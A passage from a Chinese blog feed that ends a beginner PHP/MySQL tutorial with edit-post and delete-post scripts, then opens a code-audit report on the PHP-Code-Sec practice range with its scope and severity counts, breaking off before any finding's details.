class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;../includes/db.php&#x27;</span>;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;../includes/auth.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">isLoggedIn</span>()) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: ../login.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$error</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$success</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取文章信息</span></span><br><span class="line"><span class="variable">$postId</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>] ?? <span class="number">0</span>;</span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT * FROM posts WHERE id = ? AND author_id = ?&quot;</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>([<span class="variable">$postId</span>, <span class="variable">$_SESSION</span>[<span class="string">&#x27;user_id&#x27;</span>]]);</span><br><span class="line"><span class="variable">$post</span> = <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$post</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: index.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$title</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;title&#x27;</span>]);</span><br><span class="line">    <span class="variable">$content</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">    <span class="variable">$status</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;status&#x27;</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$title</span>) || <span class="keyword">empty</span>(<span class="variable">$content</span>)) &#123;</span><br><span class="line">        <span class="variable">$error</span> = <span class="string">&#x27;标题和内容不能为空&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;</span></span><br><span class="line"><span class="string">            UPDATE posts </span></span><br><span class="line"><span class="string">            SET title = ?, content = ?, status = ?, updated_at = NOW() </span></span><br><span class="line"><span class="string">            WHERE id = ? AND author_id = ?</span></span><br><span class="line"><span class="string">        &quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>([<span class="variable">$title</span>, <span class="variable">$content</span>, <span class="variable">$status</span>, <span class="variable">$postId</span>, <span class="variable">$_SESSION</span>[<span class="string">&#x27;user_id&#x27;</span>]])) &#123;</span><br><span class="line">            <span class="variable">$success</span> = <span class="string">&#x27;文章更新成功！&#x27;</span>;</span><br><span class="line">            <span class="comment">// 重新获取文章信息</span></span><br><span class="line">            <span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT * FROM posts WHERE id = ?&quot;</span>);</span><br><span class="line">            <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>([<span class="variable">$postId</span>]);</span><br><span class="line">            <span class="variable">$post</span> = <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$error</span> = <span class="string">&#x27;更新失败，请重试&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;zh-CN&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;编辑文章 - 我的博客&lt;/title&gt;</span><br><span class="line">    &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;../css/style.css&quot;</span>&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        .editor-container &#123;</span><br><span class="line">            background: white;</span><br><span class="line">            padding: <span class="number">2</span>rem;</span><br><span class="line">            border-radius: <span class="number">5</span>px;</span><br><span class="line">            box-shadow: <span class="number">0</span> <span class="number">2</span>px <span class="number">5</span>px <span class="title function_ invoke__">rgba</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0.1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        .form-group &#123;</span><br><span class="line">            margin-bottom: <span class="number">1.5</span>rem;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        label &#123;</span><br><span class="line">            display: block;</span><br><span class="line">            margin-bottom: <span class="number">0.5</span>rem;</span><br><span class="line">            font-weight: bold;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        input[type=<span class="string">&quot;text&quot;</span>], textarea &#123;</span><br><span class="line">            width: <span class="number">100</span>%;</span><br><span class="line">            padding: <span class="number">0.75</span>rem;</span><br><span class="line">            border: <span class="number">1</span>px solid <span class="comment">#ddd;</span></span><br><span class="line">            border-radius: <span class="number">4</span>px;</span><br><span class="line">            font-size: <span class="number">1</span>rem;</span><br><span class="line">            font-family: inherit;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        textarea &#123;</span><br><span class="line">            min-height: <span class="number">300</span>px;</span><br><span class="line">            resize: vertical;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        .form-actions &#123;</span><br><span class="line">            display: flex;</span><br><span class="line">            justify-content: space-between;</span><br><span class="line">            align-items: center;</span><br><span class="line">            margin-top: <span class="number">2</span>rem;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        .status-select &#123;</span><br><span class="line">            padding: <span class="number">0.5</span>rem;</span><br><span class="line">            border: <span class="number">1</span>px solid <span class="comment">#ddd;</span></span><br><span class="line">            border-radius: <span class="number">4</span>px;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;header&gt;</span><br><span class="line">        &lt;nav&gt;</span><br><span class="line">            &lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">logo</span>&quot;&gt;我的博客&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">ul</span> <span class="title">class</span>=&quot;<span class="title">nav</span>-<span class="title">links</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">li</span>&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;../<span class="title">index</span>.<span class="title">php</span>&quot;&gt;首页&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">li</span>&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;<span class="title">index</span>.<span class="title">php</span>&quot;&gt;控制台&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">li</span>&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;<span class="title">logout</span>.<span class="title">php</span>&quot;&gt;退出&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">ul</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">nav</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">header</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    &lt;<span class="title">main</span> <span class="title">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">h1</span>&gt;编辑文章&lt;/<span class="title">h1</span>&gt;</span></span><br><span class="line"><span class="class">        </span></span><br><span class="line"><span class="class">        &lt;?<span class="title">php</span> <span class="title">if</span> ($<span class="title">error</span>): ?&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">error</span>&quot;&gt;&lt;?= $<span class="title">error</span> ?&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;?<span class="title">php</span> <span class="title">endif</span>; ?&gt;</span></span><br><span class="line"><span class="class">        </span></span><br><span class="line"><span class="class">        &lt;?<span class="title">php</span> <span class="title">if</span> ($<span class="title">success</span>): ?&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">message</span>&quot;&gt;&lt;?= $<span class="title">success</span> ?&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;?<span class="title">php</span> <span class="title">endif</span>; ?&gt;</span></span><br><span class="line"><span class="class">        </span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">editor</span>-<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">form</span> <span class="title">method</span>=&quot;<span class="title">POST</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">group</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">title</span>&quot;&gt;文章标题&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">id</span>=&quot;<span class="title">title</span>&quot; <span class="title">name</span>=&quot;<span class="title">title</span>&quot; </span></span><br><span class="line"><span class="class">                           <span class="title">value</span>=&quot;&lt;?= <span class="title">htmlspecialchars</span>($<span class="title">post</span>[&#x27;<span class="title">title</span>&#x27;]) ?&gt;&quot; </span></span><br><span class="line"><span class="class">                           <span class="title">placeholder</span>=&quot;请输入文章标题&quot; <span class="title">required</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                </span></span><br><span class="line"><span class="class">                &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">group</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">content</span>&quot;&gt;文章内容&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">textarea</span> <span class="title">id</span>=&quot;<span class="title">content</span>&quot; <span class="title">name</span>=&quot;<span class="title">content</span>&quot; </span></span><br><span class="line"><span class="class">                              <span class="title">placeholder</span>=&quot;请输入文章内容&quot; <span class="title">required</span>&gt;&lt;?= <span class="title">htmlspecialchars</span>($<span class="title">post</span>[&#x27;<span class="title">content</span>&#x27;]) ?&gt;&lt;/<span class="title">textarea</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                </span></span><br><span class="line"><span class="class">                &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">actions</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">status</span>&quot;&gt;状态:&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">select</span> <span class="title">id</span>=&quot;<span class="title">status</span>&quot; <span class="title">name</span>=&quot;<span class="title">status</span>&quot; <span class="title">class</span>=&quot;<span class="title">status</span>-<span class="title">select</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                            &lt;<span class="title">option</span> <span class="title">value</span>=&quot;<span class="title">published</span>&quot; &lt;?= $<span class="title">post</span>[&#x27;<span class="title">status</span>&#x27;] == &#x27;<span class="title">published</span>&#x27; ? &#x27;<span class="title">selected</span>&#x27; : &#x27;&#x27; ?&gt;&gt;发布&lt;/<span class="title">option</span>&gt;</span></span><br><span class="line"><span class="class">                            &lt;<span class="title">option</span> <span class="title">value</span>=&quot;<span class="title">draft</span>&quot; &lt;?= $<span class="title">post</span>[&#x27;<span class="title">status</span>&#x27;] == &#x27;<span class="title">draft</span>&#x27; ? &#x27;<span class="title">selected</span>&#x27; : &#x27;&#x27; ?&gt;&gt;草稿&lt;/<span class="title">option</span>&gt;</span></span><br><span class="line"><span class="class">                        &lt;/<span class="title">select</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                    </span></span><br><span class="line"><span class="class">                    &lt;<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">button</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">primary</span>&quot;&gt;更新文章&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">a</span> <span class="title">href</span>=&quot;<span class="title">index</span>.<span class="title">php</span>&quot; <span class="title">class</span>=&quot;<span class="title">btn</span>&quot;&gt;取消&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">main</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>逐行查看代码。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$postId</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>] ?? <span class="number">0</span>;</span><br></pre></td></tr></table></figure><ul><li>获取需要编辑的文章ID并查询文章详情。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT * FROM posts WHERE id = ? AND author_id = ?&quot;</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>([<span class="variable">$postId</span>, <span class="variable">$_SESSION</span>[<span class="string">&#x27;user_id&#x27;</span>]]);</span><br><span class="line"><span class="variable">$post</span> = <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br></pre></td></tr></table></figure><ul><li>PDO使用老方法，只查询当前用户的文章。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="variable">$post</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: index.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>如果文章不存在或者没有访问权限，则重定向到首页页面。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br></pre></td></tr></table></figure><ul><li>处理表单提交：POST请求。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$title</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;title&#x27;</span>]);</span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line"><span class="variable">$status</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;status&#x27;</span>];</span><br></pre></td></tr></table></figure><ul><li>获取并清理表单验证。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$title</span>) || <span class="keyword">empty</span>(<span class="variable">$content</span>)) &#123;</span><br><span class="line">    <span class="variable">$error</span> = <span class="string">&#x27;标题和内容不能为空&#x27;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br></pre></td></tr></table></figure><ul><li>数据验证。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;</span></span><br><span class="line"><span class="string">    UPDATE posts </span></span><br><span class="line"><span class="string">    SET title = ?, content = ?, status = ?, updated_at = NOW() </span></span><br><span class="line"><span class="string">    WHERE id = ? AND author_id = ?</span></span><br><span class="line"><span class="string">&quot;</span>);</span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>([<span class="variable">$title</span>, <span class="variable">$content</span>, <span class="variable">$status</span>, <span class="variable">$postId</span>, <span class="variable">$_SESSION</span>[<span class="string">&#x27;user_id&#x27;</span>]])) &#123;</span><br><span class="line">    <span class="variable">$success</span> = <span class="string">&#x27;文章更新成功！&#x27;</span>;</span><br></pre></td></tr></table></figure><ul><li>执行数据库更新。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT * FROM posts WHERE id = ?&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>([<span class="variable">$postId</span>]);</span><br><span class="line">        <span class="variable">$post</span> = <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$error</span> = <span class="string">&#x27;更新失败，请重试&#x27;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ul><li>重新查询获取最新数据。</li></ul><p>3.4 <code>delete-post.php</code>（删除文章处理脚本）</p><ul><li>这是一个<strong>纯处理脚本</strong>，用于安全地删除用户自己的文章，不包含任何HTML显示内容。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;../includes/db.php&#x27;</span>;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;../includes/auth.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">isLoggedIn</span>()) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: ../login.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$postId</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>] ?? <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$postId</span>) &#123;</span><br><span class="line">    <span class="comment">// 确保用户只能删除自己的文章</span></span><br><span class="line">    <span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;DELETE FROM posts WHERE id = ? AND author_id = ?&quot;</span>);</span><br><span class="line">    <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>([<span class="variable">$postId</span>, <span class="variable">$_SESSION</span>[<span class="string">&#x27;user_id&#x27;</span>]]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: index.php&#x27;</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br></pre></td></tr></table></figure><ul><li>逐行来看。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$postId</span>) &#123;</span><br></pre></td></tr></table></figure><ul><li>通过前面获取的文章ID删除文章，只有当文章ID有效时才可以删除文章，这样可以确保用户只能删除自己的文章。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;DELETE FROM posts WHERE id = ? AND author_id = ?&quot;</span>);</span><br></pre></td></tr></table></figure><ul><li>准备SQL删除语句（安全措施：同时验证文章ID和作者ID）。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>([<span class="variable">$postId</span>, <span class="variable">$_SESSION</span>[<span class="string">&#x27;user_id&#x27;</span>]]);</span><br></pre></td></tr></table></figure><ul><li>执行删除，传入文章ID和当前用户ID（防止删除他人文章）。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: index.php&#x27;</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br></pre></td></tr></table></figure><ul><li>删除完成后重定向回文章管理页面，并确保重定向后停止脚本。</li></ul><h2 id="第六部分：总结"><a href="#第六部分：总结" class="headerlink" title="第六部分：总结"></a>第六部分：总结</h2><p>​本项目成功实现了一个功能完整的简易博客系统，达到了学习和实践的目的。通过该项目我学习了PHP动态网站的开发过程、MySQL数据库的设计思路与操作，以及前端后端之间的交互过程。</p><p>​但时当前博客系统功能简单，内容也不完善仍存在部分缺陷，希望后续可以完善和改变。</p>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP-Code-Sec靶场代码审计报告</title>
      <link href="/2025/11/11/PHP-Code-Sec%E9%9D%B6%E5%9C%BA%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
      <url>/2025/11/11/PHP-Code-Sec%E9%9D%B6%E5%9C%BA%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP-Code-Sec靶场代码审计"><a href="#PHP-Code-Sec靶场代码审计" class="headerlink" title="PHP-Code-Sec靶场代码审计"></a>PHP-Code-Sec靶场代码审计</h1><table><thead><tr><th align="left">项目信息</th><th align="left">内容</th></tr></thead><tbody><tr><td align="left"><strong>报告名称</strong></td><td align="left">PHP-Code-Sec靶场代码审计报告</td></tr><tr><td align="left"><strong>审计对象</strong></td><td align="left">PHP-Code-Sec靶场</td></tr><tr><td align="left"><strong>审计日期</strong></td><td align="left">2025年11月3日 - 2025年11月11日</td></tr><tr><td align="left"><strong>审计人员</strong></td><td align="left">MosHSasA</td></tr><tr><td align="left"><strong>报告日期</strong></td><td align="left">2025年11月11日</td></tr></tbody></table><h3 id="1-执行摘要"><a href="#1-执行摘要" class="headerlink" title="1. 执行摘要"></a><strong>1. 执行摘要</strong></h3><ul><li><p><strong>1.1 审计概述</strong>：</p><ul><li><strong>审计目的：</strong>通过此靶场进行代码审计以及相关知识的学习。</li><li><strong>审计范围：</strong>主要针对靶场<strong>PHP-Code-Sec</strong>的<code>/modules/</code>和<code>/setup/</code>目录下的文件进行审计。</li><li><strong>主要方法：</strong>工具辅助（<strong>RIPS</strong>）。</li></ul></li><li><p><strong>1.2 漏洞统计</strong>：使用表格展示漏洞等级和数量，一目了然。</p><table><thead><tr><th align="left">风险等级</th><th align="left">漏洞数量</th></tr></thead><tbody><tr><td align="left">严重</td><td align="left">7</td></tr><tr><td align="left">高危</td><td align="left">8</td></tr><tr><td align="left">中危</td><td align="left">4</td></tr><tr><td align="left">低危</td><td align="left">1</td></tr></tbody></table></li><li><p><strong>1.3 整体风险评估</strong>：项目存在多个可直接导致服务器被入侵的严重漏洞，需立即修复。</p></li><li><p><strong>1.4 修复建议摘要</strong>：<strong>立即修复</strong>所有严重和高危漏洞，特别是命令执行和远程代码执行漏洞。</p></li></ul><h3 id="2-审计范围与方法"><a href="#2-审计范围与方法" class="headerlink" title="2. 审计范围与方法"></a><strong>2. 审计范围与方法</strong></h3><ul><li><strong>2.1 审计范围</strong>：<ul><li><code>/modules</code>目录下：<ul><li><code>/command/index.php</code>、<code>/cors/index.php</code>、<code>/doubleparse/index.php</code>、<code>/fi/index.php</code>、<code>/hpp/index.php</code>、<code>/idor/user.php</code>、<code>/mail/index.php</code>、<code>/override/index.php</code>、<code>/path/index.php</code>、<code>/phar/index.php</code>、<code>/rce/eval.php</code>、<code>/sqli/index.php</code>、<code>unserialize/index.php</code>、<code>/upload/index.php</code>、<code>wrapper/index.php</code>、<code>/write/index.php</code>、<code>/xss/reflected.php</code>。</li></ul></li><li><code>/setup</code>目录下：<ul><li><code>/install.php</code>。</li></ul></li></ul></li><li><strong>2.2 审计方法</strong>：<ul><li><strong>人工审计</strong>：通读关键业务逻辑代码。</li><li><strong>工具辅助</strong>：使用静态代码分析工具（<strong>RIPS</strong>）</li><li><strong>测试验证</strong>：对发现的疑似漏洞点进行模拟验证（在测试环境中，<strong>严禁直接对生产环境操作</strong>）。</li></ul></li></ul><h3 id="3-漏洞详情"><a href="#3-漏洞详情" class="headerlink" title="3. 漏洞详情"></a><strong>3. 漏洞详情</strong></h3><ul><li><h4 id="VULU-001-命令执行-modules-command-index-php"><a href="#VULU-001-命令执行-modules-command-index-php" class="headerlink" title="VULU-001 - 